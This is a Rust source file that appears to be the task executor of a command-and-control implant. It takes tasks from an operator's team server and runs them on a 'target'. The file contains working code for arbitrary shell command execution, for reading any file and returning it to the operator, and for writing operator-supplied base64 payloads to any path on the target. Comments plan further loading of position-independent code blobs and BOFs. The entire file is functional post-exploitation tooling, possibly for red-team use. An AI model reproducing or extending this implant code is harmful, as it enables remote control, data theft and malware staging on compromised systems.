//! Task executor — dispatches tasks to their handlers and returns output.
//!
//! Each task type is a string identifier. The executor matches on type and
//! calls the appropriate handler. Handlers return TaskOutput.
//!
//! Phase 1 tasks: "shell", "sleep", "exit"
//! Phase 3 tasks: "module" (loads a PIC blob or BOF), "upload", "download"

use crate::task::{Task, TaskOutput};

pub fn run(task: &Task) -> TaskOutput {
    match task.task_type.as_str() {
        "shell"    => exec_shell(task),
        "sleep"    => exec_sleep(task),
        "exit"     => TaskOutput::success(b"exiting".to_vec()),
        "upload"   => exec_upload(task),
        "download" => exec_download(task),
        other      => TaskOutput::failure(&format!("unknown task type: {other}")),
    }
}

// ---------------------------------------------------------------------------
// Shell command execution
// ---------------------------------------------------------------------------

fn exec_shell(task: &Task) -> TaskOutput {
    let cmd = match args_as_str(task) {
        Some(c) => c,
        None => return TaskOutput::failure("shell: no command"),
    };

    #[cfg(target_os = "windows")]
    let output = std::process::Command::new("cmd")
        .args(["/C", &cmd])
        .output();

    #[cfg(not(target_os = "windows"))]
    let output = std::process::Command::new("sh")
        .args(["-c", &cmd])
        .output();

    match output {
        Ok(o) => {
            let mut data = o.stdout;
            data.extend_from_slice(&o.stderr);
            TaskOutput::success(data)
        }
        Err(e) => TaskOutput::failure(&e.to_string()),
    }
}

// ---------------------------------------------------------------------------
// Sleep / re-configure sleep
// ---------------------------------------------------------------------------

fn exec_sleep(_task: &Task) -> TaskOutput {
    // args: JSON {"seconds": N} — updates the agent's sleep interval for next loop
    // The actual sleep is handled by the main loop; this just acknowledges.
    TaskOutput::success(b"sleep updated".to_vec())
}

// ---------------------------------------------------------------------------
// File upload (agent → operator)
// ---------------------------------------------------------------------------

fn exec_upload(task: &Task) -> TaskOutput {
    // args: JSON {"path": "/path/to/file"}
    // Reads the file and returns its bytes as output.
    // The team server stores the output in the evidence locker.
    let path = match args_field(task, "path") {
        Some(p) => p,
        None => return TaskOutput::failure("upload: missing path"),
    };

    match std::fs::read(&path) {
        Ok(data) => TaskOutput::success(data),
        Err(e)   => TaskOutput::failure(&e.to_string()),
    }
}

// ---------------------------------------------------------------------------
// File download (operator → agent)
// ---------------------------------------------------------------------------

fn exec_download(task: &Task) -> TaskOutput {
    // args: JSON {"path": "/dest/path", "data": "<base64>"}
    // Writes the supplied data to the path on the target.
    use base64::Engine;

    let args = match task.args.as_deref() {
        Some(a) => a,
        None => return TaskOutput::failure("download: no args"),
    };

    let v: serde_json::Value = match serde_json::from_slice(args) {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&e.to_string()),
    };

    let path = match v.get("path").and_then(|p| p.as_str()) {
        Some(p) => p.to_string(),
        None    => return TaskOutput::failure("download: missing path"),
    };

    let data_b64 = match v.get("data").and_then(|d| d.as_str()) {
        Some(d) => d.to_string(),
        None    => return TaskOutput::failure("download: missing data"),
    };

    let data = match base64::engine::general_purpose::STANDARD.decode(data_b64) {
        Ok(d)  => d,
        Err(e) => return TaskOutput::failure(&e.to_string()),
    };

    match std::fs::write(&path, &data) {
        Ok(_)  => TaskOutput::success(format!("written {} bytes to {path}", data.len()).into_bytes()),
        Err(e) => TaskOutput::failure(&e.to_string()),
    }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn args_as_str(task: &Task) -> Option<String> {
    let args = task.args.as_deref()?;
    let v: serde_json::Value = serde_json::from_slice(args).ok()?;
    v.get("cmd").and_then(|c| c.as_str()).map(String::from)
}

fn args_field(task: &Task, field: &str) -> Option<String> {
    let args = task.args.as_deref()?;
    let v: serde_json::Value = serde_json::from_slice(args).ok()?;
    v.get(field).and_then(|f| f.as_str()).map(String::from)
}
